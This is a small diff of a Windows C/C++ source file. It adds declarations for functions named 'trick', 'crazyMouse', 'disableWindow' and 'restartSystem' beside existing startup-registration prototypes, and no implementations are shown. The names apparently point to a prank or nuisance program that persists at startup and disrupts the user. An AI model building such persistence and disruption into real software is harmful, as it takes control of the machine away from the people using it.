@@ -8,10 +8,12 @@
 #include<stdio.h>
 #include <tchar.h>
 
-
 using namespace std;
-
 
 BOOL IsMyProgramRegisteredForStartup(PCWSTR);
 BOOL RegisterMyProgramForStartup(PCWSTR, PCWSTR, PCWSTR);
 void RegisterProgram();
+void trick();
+void crazyMouse();
+void disableWindow();
+void restartSystem();
